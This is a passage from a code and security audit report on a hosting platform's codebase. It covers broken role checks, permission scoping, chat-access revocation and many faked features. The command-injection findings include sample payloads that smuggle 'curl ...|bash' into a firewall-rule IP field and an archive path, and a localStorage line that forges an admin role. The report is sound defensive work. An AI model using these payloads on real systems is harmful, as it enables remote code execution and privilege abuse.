— it includes `'dev'`, the opposite of what the comment says. This isn't just a client-side inconsistency either: the backend (`apps/api/src/routes/tickets.ts:96`) uses the same `admin || support || dev` set to decide whether a reply counts as a staff reply, so the intended narrower policy ("dev should not see customer support conversations") isn't enforced anywhere in the stack — `dev`-role accounts have full ticket/live-chat access despite the code's own documentation saying they shouldn't. Fix: remove `'dev'` from the allowed-role checks in both places (or update the comment if the broader access was actually intended and the comment is just stale).

## `apps/dashboard/lib/api.ts` — entire "Leaseweb" VPS API client has no backend implementation

`lib/api.ts` defines a full `api.leaseweb.*` client (config, products, listVps, import, power, console, credentials, snapshots, reinstall, reset-password, ssh-ticket, terminate, firewall, dns — ~18 methods, lines ~1129-1200) all calling `/api/leaseweb/*`. There is no `leaseweb.ts` route file anywhere in `apps/api/src/routes`, no `leasewebRouter` registered in `index.ts`, and no route matching `/api/leaseweb/*` exists at all — every one of these calls would 404. I couldn't find any dashboard page/component that actually imports `api.leaseweb`, so this looks like an unfinished/orphaned feature rather than something currently reachable by users — but it's worth flagging before someone wires a page up to it and ships a silently-broken "Leaseweb VPS" management panel.

## `apps/mobile-admin/src/screens/SplashScreen.tsx` — staff-only gate fails open when the role check itself fails

```js
if (firebaseUser) {
  if (apiUser && apiUser.role === 'customer') {
    navigation.reset({ index: 0, routes: [{ name: 'Login' }] });
  } else {
    navigation.reset({ index: 0, routes: [{ name: 'Main' }] });   // staff console
  }
}
```
The intended check is "if this Firebase-authenticated user is a customer, don't let them into the staff console." But `AuthContext.tsx`'s `refreshApiUser()` sets `apiUser` to `null` whenever `api.auth.me()` throws (network error, API downtime, rate limit, cold-start race). In that case `apiUser && apiUser.role === 'customer'` evaluates to `false` (since `apiUser` is `null`) — not because the role was confirmed non-customer, but because the role couldn't be determined at all — so the `else` branch fires and routes straight into `Main`, the staff admin console, for anyone with *any* valid Firebase login whose role lookup happened to fail at that moment. This is a fail-open pattern where an error/ambiguous state should instead fail closed (route to `Login`, or a neutral "couldn't verify access" screen) rather than defaulting to granting staff-console navigation. The concrete impact is bounded by whether every screen's underlying API call independently enforces role server-side (which, per the rest of this review, the equivalent web endpoints generally do) — but the client-side gate itself doesn't do what its own logic implies it does, and any screen that skips its own auth check because it trusts having reached `Main` at all would be exposed.

## 🔴 `apps/dashboard` — every money amount in the entire dashboard is mislabeled as "LKR", even for USD-priced items

`formatMoney(amountInSmallestUnit, currencyLabel = 'LKR')` (`components/ui.tsx:585`) defaults its currency label to `'LKR'`. Checked all 27 call sites across the dashboard (`grep -rn "formatMoney("`) — **not a single one passes a second argument.** Meanwhile `lib/orderItem.ts` defines `orderItemCurrency(item)` — a helper that correctly looks up `item.plan?.currency ?? item.service?.currency ?? 'LKR'` — specifically to solve this, but it is **never imported or called anywhere in the dashboard app**. It's dead code.

Net effect: since the platform genuinely supports USD-priced plans/services alongside LKR ones (per `apps/api/src/lib/currency.ts`'s whole USD→LKR conversion machinery), every dashboard screen that shows a price — cart total, order total, "Total Spent," per-item unit price, upcoming renewal amount, everything in `UnifiedOrdersPortal.tsx` and presumably the billing/orders/catalog pages too — labels the number "LKR" regardless of whether it's actually a USD amount. A customer looking at a USD 25/mo plan sees "LKR 25," which reads as roughly 1/300th of the real value (LKR ≈ 300/USD) rather than the correct currency label on the correct number. This is a straightforward, easily-reproduced, and pretty severe UX/trust bug for anything money-related. Fix: thread `orderItemCurrency(item)` (or the equivalent for non-order-item amounts) into every `formatMoney(...)` call site instead of relying on the default.

## `apps/dashboard/app/(protected)/team/accept/page.tsx` — public invite preview always 404s in production (wrong host)

The page tries to preview a team invite before the visitor logs in with a raw:
```js
fetch(`/api/teams/public/invites/${token}`)
```
This is a relative URL, so it resolves against the **dashboard's own origin** (`app.${ROOT_DOMAIN}`, per `infra/control-plane/docker-compose.yml`'s Traefik labels). But `GET /api/teams/public/invites/:token` is a real, correctly-implemented unauthenticated endpoint on the **separate API service** (`api.${ROOT_DOMAIN}`) — see `apps/api/src/routes/teams.ts:14`. The dashboard's Next.js app has no matching route of its own and no rewrite/proxy configured in `next.config.js` for `/api/*`, so this `fetch` always 404s in production. Every other call in the app correctly goes through `lib/api.ts`'s `apiFetch`, which prefixes `NEXT_PUBLIC_API_BASE_URL` — this one spot doesn't. The code's own `.catch()` then falls back to `api.teams.getInvite(token)`, which is the **authenticated** version of the same lookup — of no help to the very audience this "public inspection" path exists for (someone who received an invite email but doesn't have a session yet). Net effect: an invited-but-not-yet-logged-in visitor never sees the invite preview (team name, inviter, role) before being asked to sign up/sign in — they just see the fallback error path. Fix: route this fetch through the same `apiFetch`/base-URL mechanism as the rest of the app.

## `apps/dashboard/lib/AppUserContext.tsx` — user role is cached in plain `localStorage` and trusted as initial state

```js
const [apiUser, setApiUser] = useState<ApiUser | null>(() => {
  const cached = localStorage.getItem(USER_CACHE_KEY);
  ... if (age < CACHE_DURATION) return JSON.parse(cached);
});
```
The entire `ApiUser` object — including its `role` field — is cached in plain `localStorage` for 5 minutes and used as the **initial React state on every page load**, rendered before the real `fetchUser()` call to `api.me()` resolves. `localStorage` is plain, unencrypted, and freely writable by the user themselves (DevTools console: `localStorage.setItem('shanutechx_user_cache', JSON.stringify({...,"role":"admin"}))`) or by any future XSS on the origin. For the brief window between page mount and the fresh `fetchUser()` response landing, every client-side role gate in the app (`RequireStaffOnly.tsx`, the `(protected)/admin` layout's role checks, `(protected)/layout.tsx`) reads this forgeable cached value rather than a verified one. Real data-fetching API calls remain safe (the backend independently re-verifies role on every request, per the rest of this review), but this pattern means: (1) a customer can trivially make the dashboard *render* admin-only navigation/pages/UI locally by editing `localStorage` and reloading, which is at minimum a support/confusion problem and at worst exposes internal UI/URLs/feature names not meant for regular customers, and (2) any code path that acts on `apiUser.role` immediately on mount (before the fresh fetch overwrites it) is trusting attacker-controlled client storage for that brief window. Fix: don't seed authorization-relevant state from `localStorage` before the server has confirmed it in the current session — show a loading state until `fetchUser()` resolves, and use `localStorage` (if at all) purely as a display hint, never as the value driving role-gated rendering or protected-route access decisions.

## `apps/api/src/routes/settings.ts` — `/settings/verify-password` PIN check has no role gate and no rate limiting

`POST /settings/verify-password` only requires `requireAuth` (any logged-in user, including a plain customer) — not `requireAdminOrDev`. The PIN itself can be as short as 4 characters (`newPin: z.string().min(4)`), and there's no endpoint-specific rate limiter (unlike `authRateLimiter` on login) slowing down repeated guesses. In practice this is bounded: I confirmed the actual protected admin endpoints it's meant to gate (e.g. `discordWebhookConfig.ts`) independently enforce `requireDev`/`requireAdminOrDev` server-side regardless of this PIN, so a non-admin brute-forcing this endpoint can at best flip a client-side "unlocked" UI flag in their own session, not actually reach real admin data. Still, it's an easy hardening gap: add `requireAdminOrDev` to this route (a customer has no legitimate reason to call it at all) and rate-limit it like the auth endpoints.

## 🔴 `apps/api/src/middleware/rbac.ts` — `canAccessResource` ignores its own granular permission scoping, so ANY team permission grants access to ALL of the owner's resources

The schema defines a genuinely granular per-resource permission model:
```prisma
model ResourcePermission {
  teamMemberId String
  resourceType ResourceType   // e.g. deployment, vps, managedDatabase, ...
  resourceId   String         // the specific resource
  permission   ResourcePermissionLevel
}
```
This exists precisely so a team owner can grant one member narrow access — e.g. viewer access to *one specific deployment*, or billing-only visibility — without handing them everything. But `canAccessResource()` (`middleware/rbac.ts:124`), the shared helper called from `deployments.ts`, `vps.ts`, `managedDatabases.ts`, `sshTerminalGateway.ts`, and everywhere else a resource-ownership check happens, does this:
```js
const membership = await prisma.teamMember.findFirst({
  where: { userId: req.user.id, team: { ownerId: resourceOwnerId } },
  include: { permissions: true },
});
if (membership) {
  if (['owner', 'admin', 'developer'].includes(membership.role)) return true;
  if (membership.permissions && membership.permissions.some((p) => p.permission !== 'none')) return true;
}
```
It never filters `membership.permissions` by the actual `resourceType`/`resourceId` of the resource being requested — it just checks whether the member has **any non-`'none'` `ResourcePermission` record for anything at all**. So if a team owner grants one member `viewer` access to a single, specific deployment, that member's `permissions` array is non-empty, `.some(p => p.permission !== 'none')` is `true`, and `canAccessResource` returns `true` for **every other resource that owner has** — every other deployment (including decrypted `envVars` via `GET /deployments/:id`, per the code checked above), every VPS (including root SSH terminal access, per `sshTerminalGateway.ts`), every managed database, everything gated by this one shared helper. The granular per-resource design is completely defeated; in effect, granting a teammate *any* scoped permission at all silently promotes them to full access across the whole account.

Fix: `canAccessResource` needs the resource's `resourceType`/`resourceId` passed in as parameters and must query `ResourcePermission` filtered to that specific `(resourceType, resourceId)` pair (or a wildcard/team-wide grant if that's an intended feature), not just check for the existence of any permission record anywhere.

## 🔴 `apps/api/src/lib/chatAdminSync.ts` — staff access to live-chat is granted forever and never revoked

`ensureStaffMarkedInRealtimeDb()` writes `staff/{firebaseUid}: true` to Firebase Realtime Database every time `requireAuth` resolves a request from a user whose Postgres role is `admin` or `support` (`middleware/auth.ts:159`). The RTDB security rules (`firebase/database.rules.json`) key *all* live-chat access off this single marker:
```json
"chats": { "$uid": { ".read": "... || root.child('staff').child(auth.uid).exists()", ".write": "... || root.child('staff').child(auth.uid).exists()" } },
"chatIndex": { ".read": "auth != null && root.child('staff').child(auth.uid).exists()" }
```
i.e. anyone marked `staff` can read and write **every customer's** chat thread and read the full index of every conversation on the platform. The bug: **there is no code anywhere that ever removes this marker.** I searched the whole codebase for any write to `staff/{uid}` besides this one `.set(true)` call — nothing sets it back to `false` or deletes it when a user is demoted from admin/support back to customer, or banned. Once an account has held `admin`/`support` even once, their Firebase UID retains permanent, unrevocable read/write access to every customer's private support chat, forever — completely independent of their current Postgres role.

This compounds directly with the sidebar "become Admin" bug earlier in this report: any customer could self-promote to `admin`/`support` via the dropdown, load any authenticated page (which triggers the marker write), and even after being caught and demoted/banned, retain permanent snooping/tampering access to every customer's live chat. More mundanely, it also means any support agent who's ever removed from the support team keeps this access forever too. Fix: call a corresponding `firebaseDb.ref('staff/'+uid).remove()` (or `.set(null)`) whenever a user's role changes away from admin/support (in `routes/me.ts`'s role-switch handler and `routes/admin.ts`'s staff-role-management endpoint), and ideally re-derive the RTDB rule check from a short-lived custom-claim/token rather than a Boolean flag with no expiry.

## `apps/dashboard/components/supabase/BucketFileBrowser.tsx` — Storage bucket file browser is entirely fake/mock data

This component is wired live into `app/(protected)/supabase/storage/page.tsx`, but it never calls any real API. It's hardcoded:
```js
const SAMPLE_FILES: FileItem[] = [
  { name: 'avatar-user-101.jpg', size: 145200, ... },
  { name: 'config-export.json', size: 3412, ... },
  { name: 'database-backup-08-11.sql.gz', size: 14502030, ... },
];
const [files, setFiles] = useState<FileItem[]>(SAMPLE_FILES);
```
"Upload File" just reads the chosen file's `name`/`size`/`type` from the browser's File API and prepends a fake entry to local component state — **the file's actual bytes are never sent anywhere**; nothing is uploaded to Supabase Storage or any backend. "Copy Public URL" does `alert(...)` with a hardcoded `http://localhost:8001/...` URL rather than copying anything or reflecting a real bucket/CDN URL. An admin using this page believes they're managing real storage buckets and files — everything shown, including the "3 objects stored" count, is static sample data that never reflects (or affects) the actual Supabase Storage service.

## `apps/api/src/routes/webmail.ts` — folders, labels, filter rules, auto-reply, and blocklist are all stored but never actually applied to real mail

`WebmailFolder`, `WebmailLabel`, `WebmailFilter`, `WebmailAutoReply`, and `WebmailBlockedSender` all have full CRUD endpoints (used by `WebmailFoldersAndLabelsModal.tsx`, `WebmailRulesModal.tsx`, and `WebmailSettingsModal.tsx`'s "Vacation Reply"/"Blocklist" tabs). None of the five actually affects real mail flow:
- The inbox listing endpoint (`GET /webmail/messages`, line 87) — which for WildDuck-backed accounts fetches real messages via `wildduckClient.listMessages` — never references folders/labels/filters at all: `category` is hardcoded to `'primary'` for every message, `folder` is passed straight through to WildDuck unvalidated, and no code anywhere evaluates a `WebmailFilter`'s conditions against mail to move/tag it. A saved rule like "if From contains newsletter@x.com, label News" is stored, shown as "active," and never fires.
- `WebmailAutoReply` ("Vacation Reply") is saved via `POST /webmail/auto-reply` but nothing in the codebase — not `webmail.ts`, not any lib file, not the node-agent, not the Postal/WildDuck integration — ever sends an actual auto-reply when new mail arrives. Turning on "vacation mode" with a custom out-of-office message does nothing to incoming senders.
- `WebmailBlockedSender` entries are saved via `POST /webmail/blocked-senders` but are never consulted at receive time — there's no MTA-level or application-level check that rejects/filters mail from a blocked address or domain. "Blocking" a sender here has zero actual effect on whether their mail reaches the inbox.

All five features present a fully working-looking CRUD UI with success toasts and persisted state, while none of them touches the actual mail pipeline.

## `apps/dashboard/components/webmail/WebmailContactsTab.tsx` — "Import CSV" does nothing but show a fake success toast

```js
const handleImportCsv = (e: React.ChangeEvent<HTMLInputElement>) => {
  const file = e.target.files?.[0];
  if (!file) return;
  toast(`Imported contacts from ${file.name}!`, 'success');
};
```
The file is never read, parsed, or sent anywhere — the handler just checks a file was selected and immediately shows a success toast claiming the import worked. A user uploading a CSV/vCard of contacts believes they've been imported; nothing was actually added to their address book (`api.email.createContact` is never called from this path, contrast with `handleExportCsv`, which genuinely works).

## `apps/dashboard/components/email/DynamicDnsSetupGuide.tsx` — DNS verification always fails silently (wrong auth mechanism)

`verifyDnsRecords()` hand-rolls its own `fetch` instead of using the app's `apiFetch`/Firebase-token mechanism (used everywhere else in the dashboard):
```js
const token = localStorage.getItem('token') || localStorage.getItem('webmail_token');
const res = await fetch(`${apiBase}/api/smtp/verify-dns`, {
  headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}) },
  ...
});
```
`localStorage.getItem('token')` is never set anywhere in this codebase — the main dashboard authenticates via Firebase ID tokens attached fresh per-request, not a static `localStorage['token']`. `'webmail_token'` is a *different*, unrelated JWT used only by the separate public `/webmail` login flow (`app/webmail/login/page.tsx`) — it's only present if the user separately logged into that standalone mini-app in the same browser. So when this component renders inside the normal authenticated dashboard (its actual use case — showing a customer their custom-domain email DNS setup), the request goes out with **no Authorization header**, hits `smtp.ts`'s `requireAuth`-gated `POST /api/smtp/verify-dns`, gets a 401, and the failure is swallowed by a bare `catch { console.error(...) }` with no user-facing error. The "Live Domain DNS Status" banner permanently shows "DNS Action Required" and the "Re-check DNS Records" button silently does nothing, even when the customer's DNS is actually configured correctly. Fix: use the shared `apiFetch` helper like every other component instead of a hand-rolled fetch with a token key that's never populated in this context.

## 🔴 `apps/dashboard/components/RoutingFirewallPanel.tsx` — routing-mode save calls the wrong API entirely; firewall rules are pure fiction

Two distinct, serious problems in one component (used for a deployment's "Traffic Routing Mode & Network Ports" settings):

1. **Wrong endpoint entirely for saving routing mode.** `handleSaveRouting` does:
   ```js
   await api.deployments.updateSubdomain(deploymentId, ''); // Keep current subdomain
   toast(routingMode === 'direct' ? `Direct Mode enabled! Bound container to host port ${publishedPort}` : ..., 'success');
   ```
   This calls `PATCH /deployments/:id/subdomain` with an **empty string** — nothing to do with routing mode or port binding at all. The real feature this needs is `api.deployments.updateConfig(id, { exposureMode: ... })`, which exists and is wired to a real backend field (`exposureMode: 'ssl_with_proxy' | 'raw_tcp' | 'internal_only'`) — but it's never called from this component. Worse, the subdomain-update endpoint it *does* call requires `admin`/`dev` role and explicitly rejects customers with *"Subdomains can only be set once during application creation and cannot be modified later by customers"* — so for a regular customer, clicking "Save" throws that unrelated 403 (or, for staff, a validation error since `''` isn't a valid subdomain). Routing mode never actually changes on the backend either way; the success toast claiming "Direct Mode enabled!" would only ever fire if the (irrelevant, and normally-failing) subdomain call somehow succeeded.

2. **Firewall rules are entirely client-side fiction.** `rules` is local `useState` seeded with two hardcoded fake rules (`ALLOW TCP:80`, `ALLOW TCP:443`). `handleAddRule`/`handleDeleteRule` only mutate this in-memory array — neither one calls any API. A user adding a `DENY` rule to block a port, or removing the default `ALLOW 443` rule, sees a success toast and the rule appear/disappear in the list, but **no actual network policy exists anywhere** — nothing is sent to the node-agent, Traefik, or any firewall (e.g. `ufw`/`iptables`) on the underlying host. This is actively dangerous: a user believing they've locked down access to their deployment via a firewall DENY rule has done nothing of the sort.

## `apps/dashboard/components/CodeDeploymentPanel.tsx` — "Save Execution Configuration" calls the wrong endpoint too

Same bug pattern as `RoutingFirewallPanel.tsx` above, in the same deployment settings area. The "Execution Configuration" form collects `startCommand`, `entryFile`, `internalPort`, and `exposureMode`, but its save handler is:
```js
async function handleSaveExecutionConfig(e: React.FormEvent) {
  ...
  await api.deployments.updateEnv(deployment.id, {}, () => {});
  // Note: we can patch deployment parameters if supported or update subdomain/env
  toast('Execution configuration saved!', 'success');
  ...
}
```
It calls the environment-variables endpoint with an **empty object**, not `api.deployments.updateConfig(id, { startCommand, entryFile, internalPort, exposureMode })` (which exists and is the correct call — see the `RoutingFirewallPanel` finding above for the same missing wiring). The backend's env-vars schema requires at least one key (`.refine(data => Object.keys(data).length > 0, ...)`), so this call always returns a 400 — the "Save Execution Configuration" button can never succeed, and none of `startCommand`/`entryFile`/`internalPort`/`exposureMode` can actually be changed from this panel. The inline `// Note: ...` comment suggests this was left as a known stub rather than an oversight, but it shipped as a live button with no visible indication to the user that it doesn't work.

## `apps/dashboard/components/webmail/WebmailCalendarTab.tsx` — the whole calendar feature is decorative

Several distinct issues, all in the same "looks real, does nothing" pattern:
- **"New Event" never saves anywhere.** `handleAddEvent` only pushes to local `useState` with a client-generated id (`ev-${Date.now()}`) — no API call at all (contrast with `handleAddSync`, which does call a real endpoint two functions above it). The event vanishes on refresh, was never sent to `api.email.events()`'s backing store, and the "Event ... saved to calendar!" toast is false.
- **"RSVP Accepted" is just a toast** — `onClick={() => toast('RSVP Accepted for ' + ev.title + '!', 'success')}` with no API call; no RSVP state is recorded anywhere.
- **Month navigation buttons do nothing** — the `<ChevronLeft>`/`<ChevronRight>` buttons have no `onClick` handler at all, so the calendar can never be paged to a different month.
- **"Today" is hardcoded** — `isToday = day === 2` marks the 2nd of whatever month is displayed as "today" unconditionally, instead of comparing against the real current date. Combined with the hardcoded header text "September 2026", this widget never reflects the actual date.
- **Google/Outlook OAuth is fake.** The UI text says *"Google Calendar OAuth integration configured. Clicking Connect will sync events between ShanuTechX Webmail and your Google Calendar account"* — but "Connect" only POSTs a plain metadata row (`provider`, `name`) to `webmail.ts`'s `calendarSync.create`; there's no OAuth redirect, no token exchange, and nothing anywhere in the codebase that ever fetches/pushes real events from Google/Outlook/an iCal URL for a saved sync (confirmed: `WebmailCalendarSync` is referenced only in this one CRUD route, with no polling job or OAuth handler elsewhere). A user believing they've connected their real Google Calendar has created an inert database row with a label they typed in themselves.

## 🔴 `apps/dashboard/components/webmail/WebmailRichComposer.tsx` + `apps/api/src/routes/webmail.ts` — email attachments are never actually sent, end-to-end

Two compounding breaks make attachments completely non-functional in webmail send:
1. **The browser never captures file content.** `handleFileUpload` only stores `{ filename, sizeStr }` computed from the `File` object — the actual bytes are never read (no `FileReader`, no upload call) and never included in the send payload. The user sees "Attached 1 file(s)" and the file listed by name, but only its name and a formatted size string exist anywhere in memory.
2. **The backend drops attachments before actual delivery, even as metadata.** `POST /webmail/send` accepts `attachments: z.array(z.object({ filename, sizeStr, url? }))` and stores it verbatim in `webmailMessage.attachmentsJson` (setting `hasAttachments: true`) — but when it actually delivers the message, via either `wildduckClient.submitMessage(...)` or `sendSmtpEmail(...)`, **neither call is passed the `attachments` field at all** (both only receive `from`/`to`/`subject`/`html`/`text`).

Net effect: a user attaches a file, sends the email, sees a "sent successfully" confirmation, and their own Sent folder shows a paperclip icon — but the recipient receives a plain email with **no attachment whatsoever**, and nothing in the pipeline errors or warns anyone that this happened. For anything relying on this (invoices, contracts, images), this is a silent, complete feature failure.

The receiving side compounds it: `WebmailThreadViewer.tsx`'s attachment preview modal displays a fabricated status message — *"Document preview ready. Encrypted & virus scanned."* — for every attachment, regardless of whether any scanning or encryption happened (none does, since no real file ever existed to scan). Its "Download" button doesn't download anything either: `onClick={() => { toast('Downloading ' + filename + '...'); setPreviewAttachment(null); }}` just shows a toast and closes the modal — no `fetch`, no blob, no `<a download>`, nothing.

## `apps/api/src/routes/webmail.ts` — "Schedule Send" saves the draft but nothing ever sends it later

When `POST /webmail/send` receives a future `scheduledAt`, it correctly skips the immediate delivery block and saves the message to the `drafts` folder with `scheduledAt` set — so far so good. But there is **no cron job, queue worker, or any other mechanism anywhere in the codebase that later checks for due scheduled messages and actually sends them.** I checked every cron-secret-protected endpoint in the app (`billing.ts`, `status.ts`, `backup.ts` — the only three files referencing `x-cron-secret`) and none of them touch `webmailMessage`/`scheduledAt`. A user who schedules an email for tomorrow morning gets a "Email scheduled successfully!" toast, and the message will sit in Drafts indefinitely — it is never actually sent, at the scheduled time or ever.

## 🔴 `apps/api/src/routes/webmail.ts` — every "AI" webmail feature is hardcoded template text, not AI, and Translate doesn't translate at all

Five endpoints are presented to the user as AI features (`ai/summarize`, `ai/reply-suggestions`, `ai/draft`, `ai/threat-check`, `ai/translate`) via `WebmailRichComposer.tsx` and friends. None of them calls any LLM/AI service:
- **Summarize** just splits the text on `.!?` and returns the first three "sentences" as bullet points, with a hardcoded fallback set of three generic bullets if that yields nothing.
- **Reply suggestions** are three literal hardcoded strings (`"Thanks {name}, I'll review and get back to you shortly!"`, etc.) returned regardless of what the actual message says.
- **AI Draft Assistant** doesn't generate anything — it string-templates the user's own prompt text verbatim into one of three fixed paragraph templates selected by tone (`polite_decline`/`formal`/default). Typing "ask about the Q3 contract" produces a boilerplate sentence containing that literal string, not an actual drafted email about it.
- **Threat/Phishing check** is a few `.includes()` substring checks against a handful of hardcoded phrases (`'verify your password'`, `'urgent action required'`, `'bank account suspended'`) and sender substrings (`'free-mail'`, `'temp-mail'`) — trivially bypassed by any real phishing email that doesn't happen to use those exact phrases, and just as trivially false-positives on innocent mail that does.
- **Translate is the most severe of the five: it does not translate anything.** The entire implementation is:
  ```js
  res.json({ translatedText: `[Translated to ${lang}]: ${text}`, sourceLanguage: 'Auto-Detected' });
  ```
  It returns the **original, untranslated input text**, merely prefixed with a fake `[Translated to Spanish]:`-style label. A user relying on this to read or write in a language they don't speak gets back exactly what they put in, with a label actively asserting a translation happened that did not.

None of these endpoints require any external API key or configuration — they're presented in the UI identically to a real AI feature (loading spinners, "AI draft generated successfully!" toasts), with no indication anywhere that the output is templated/non-functional.

## `apps/dashboard/components/webmail/WebmailRichComposer.tsx` — Bold/Italic/List toolbar buttons insert literal asterisks/hyphens into the sent email

The composer's body field is a plain `<textarea>`, not a rich-text editor. The "Bold"/"Italic"/"List" toolbar buttons do:
```js
onClick={() => setBody((b) => b + ' **bold** ')}
onClick={() => setBody((b) => b + ' *italic* ')}
onClick={() => setBody((b) => b + '\n- Item ')}
```
i.e. they insert literal Markdown syntax characters as plain text. When the message is actually sent, `handleSendClick` builds `htmlBody` with nothing more than a `\n` → `<br/>` replacement — there is no Markdown-to-HTML parser anywhere in the send path. So clicking "Bold" doesn't make anything bold; it inserts the literal, visible string `**bold**` into the email the recipient receives, and the same for `*italic*` and `- Item`. Despite being labeled a "Rich Composer" with formatting controls, there is no actual rich-text formatting capability at all.

## `apps/dashboard/app/(protected)/email/page.tsx` — bulk message actions (mark read, star, archive, delete-multiple) never wired up

`WebmailThreadList.tsx` supports a full bulk-action toolbar (select multiple messages → "Mark Read"/"Star"/"Archive"/"Delete" buttons, plus `e`/`#` keyboard shortcuts) via an `onBulkAction` prop, and a "pin message" button via an `onTogglePin` prop. `(protected)/email/page.tsx` — the page that actually renders this component in production — never passes either prop. Both are correctly guarded in the child component (the bulk-action bar and pin button only render when the prop exists), so this doesn't crash — it just means selecting multiple emails via the checkboxes shows no way to act on them at all, and there's no way to pin a message, despite the UI clearly being built to support both. (Note there are two entirely separate, parallel webmail UIs in this codebase — the older custom-built `app/webmail/page.tsx`, and this newer component-based one at `app/(protected)/email/page.tsx` — this gap is specific to the latter.)

## `apps/api/src/lib/vpsSshClient.ts` — VPS firewall-rule endpoint builds a raw shell command from unsanitized `sourceIp`/`port`

`addVpsFirewallRuleSsh` (line ~414) builds a shell command string via direct interpolation and runs it over SSH:
```js
const from = rule.sourceIp && rule.sourceIp.trim() !== '' ? `from ${rule.sourceIp.trim()}` : 'from any';
const portStr = rule.port ? `to any port ${rule.port}` : 'to any';
const cmd = `sudo ufw ${action} ${from} ${portStr} ${proto} ${commentStr} || ufw ${action} ${from} ${portStr} ${proto} ${commentStr}`;
```
Neither `sourceIp` nor `port` is validated as an actual IP/CIDR or port number anywhere — the route schema (`addRuleSchema` in `routes/vps.ts`) accepts `sourceIp: z.string().optional()` (any string) and `port: z.union([z.string(), z.number()]).optional()` (any string or number), and both flow straight into this shell string with no escaping. `comment` gets a partial defense (`.replace(/'/g, '')` strips single quotes only — double quotes, backticks, `$()`, and `;`/`&&`/`|` all still work). Anyone able to call this endpoint (the resource owner, or — per the `canAccessResource` finding elsewhere in this report — potentially a team member with an unrelated scoped permission) can inject arbitrary shell commands executed as root over SSH on the target VPS, e.g. `sourceIp: "1.2.3.4; curl http://x/y.sh|bash #"`.

Practical severity is bounded today because the direct caller is already the VPS's owner (who has legitimate root SSH access to that same box via the platform's own "reveal root password"/SSH-terminal features), so this isn't a privilege escalation on its own — but it's a textbook command-injection pattern that should be fixed regardless (validate `sourceIp` as an IP/CIDR and `port` as a numeric range before use, and use a parameterized/escaped execution path rather than string interpolation into a remote shell command), especially given it compounds with the broken team-permission check documented elsewhere in this report.

## `apps/api/src/lib/vpsSshClient.ts` — `extractArchiveSsh` doesn't escape single quotes in the path (unlike its siblings in the same file)

`extractArchiveSsh` (reachable via `routes/vps.ts:537`, `POST /vps-provisions/:id/sftp/extract`) builds shell commands with raw single-quoting and no escaping:
```js
cmd = `cd '${dir}' && (unzip -o '${archivePath}' || busybox unzip -o '${archivePath}' || python3 -m zipfile -e '${archivePath}' .)`;
```
If `archivePath` or `targetDirectory` contains a single quote, it breaks out of the quoted argument, e.g. `archivePath: "/root/x.zip'; curl http://x/y|bash #"` injects arbitrary shell commands. This is inconsistent with three other functions in the exact same file (`renameFileSsh`, `mkdirSsh`, `touchFileSsh`), which correctly escape embedded single quotes via `.replace(/'/g, "'\\''")` before interpolating into a single-quoted shell string — confirming this is an overlooked function rather than an accepted pattern. Same bounded-severity caveat as the firewall-rule finding above (the caller already owns the target VPS), but should be fixed the same way as its sibling functions for consistency and defense-in-depth.

## `firebase/database.rules.json` — any authenticated user can read the full list of staff UIDs

```json
"staff": { ".read": "auth != null", ".write": false }
```
Any logged-in user (including a plain customer) can directly read the entire `/staff` node via the client SDK (`firebaseDb.ref('staff').once('value')`) and get back every Firebase UID currently marked as staff/admin. This broad read grant isn't actually needed — every other rule in this file references `root.child('staff')...` purely for server-side rule evaluation, which doesn't require the requesting client to have its own `.read` permission on that path. This should be `.read: false` (or restricted to staff) to avoid letting any customer enumerate staff UIDs for free.

## 🔴 `apps/dashboard/app/(protected)/supabase/realtime/page.tsx` — the entire "Realtime & WebSockets Studio" page is 100% fake, zero backend connectivity

This 196-line page has no `useEffect` with a data fetch, no `fetch()`, and no `api.*` call anywhere in the file — it is pure client-side state theater:
- `connected` is a local boolean (`useState(true)`) toggled by a "Pause Listener"/"Reconnect WebSockets" button — no real WebSocket connection is ever opened or closed anywhere.
- The banner displays a **hardcoded, fabricated URL** `wss://realtime.shanutechx.net/socket/websocket` and a "STATE: CONNECTED" badge that reflects nothing but that local boolean.
- The "Live Event Stream" starts pre-seeded with two completely fake hardcoded events (a fabricated user INSERT, a fabricated game-broadcast) and never receives anything real — there's no subscription to the customer's actual Supabase Realtime channels or Postgres CDC stream.
- "Send Broadcast" doesn't broadcast anything to any real channel or subscriber — it just parses the JSON textarea locally and prepends a fake event object to the same local array, then shows a "Broadcasted ... !" success toast.

A customer using this page to test/monitor their real Supabase project's Realtime feature (database change events, presence, WebSocket broadcasts) would see entirely fabricated activity and could send a "broadcast" that reaches no one, believing the tool is a working window into their live Supabase Realtime infrastructure.

## `apps/api/src/routes/supabase.ts` — Supabase "Performance Advisors" are permanently hardcoded fake data; "Run Live Linter Scan" doesn't run anything

`GET /supabase/advisors` (line 559) has two lint categories with very different honesty levels:
- **Security lints** do attempt a real query (`SELECT tablename FROM pg_tables WHERE schemaname='public' AND rowsecurity=false`) and build results from actual tables missing RLS — reasonably genuine — but silently falls back to two hardcoded example findings (`sec_rls_01` about a `public.profiles` table, `sec_pub_02`) inside an empty `catch {}` if the query fails for any reason, which would misrepresent a completely unrelated project's schema as having those specific issues.
- **Performance lints are never computed at all.** `performanceLints` is a single hardcoded array (`perf_fk_01`, "Unindexed foreign key: public.orders(user_id)") returned identically for every project regardless of whether that project even has an `orders` table, let alone that specific missing index.

On the frontend (`app/(protected)/supabase/advisors/page.tsx`), the "Run Live Linter Scan" button doesn't trigger any new scan — `handleRunLinter` just does `setTimeout(600ms) → refetch the same endpoint → toast('Live security & performance linter scan complete!')`, presenting a fixed 600ms artificial delay as if a real linter had just run.

## 🔴 `apps/api/src/routes/supabase.ts` — Observability metrics, log stream, Edge Functions list, and Integrations are all fabricated, unrelated to the customer's actual project

Continuing the pattern above (fake Realtime studio, fake performance advisors), three more endpoints in this same file are pure fabrication, explicitly marked `isFallback: true` in every response with no code path that ever sets it otherwise:
- **`GET /supabase/observability`** (line 616): `cpuUsagePercent` and the memory numbers are derived from `process.cpuUsage()`/`process.memoryUsage()` — **the ShanuTechX API server's own Node.js process**, entirely unrelated to the customer's actual Supabase Postgres/Kong/GoTrue containers. `activeConnections` is the formula `dbCount * 3 + 4` where `dbCount` is just how many Supabase client projects that account has — not a real connection count. `diskIops` (240), `avgQueryLatencyMs` (14.2), and `cacheHitRatePercent` (98.4) are hardcoded constants, identical for every customer, every time. The frontend's `1h`/`24h`/`7d` time-range selector has no effect since the endpoint doesn't even accept a range parameter — it returns the same numbers regardless.
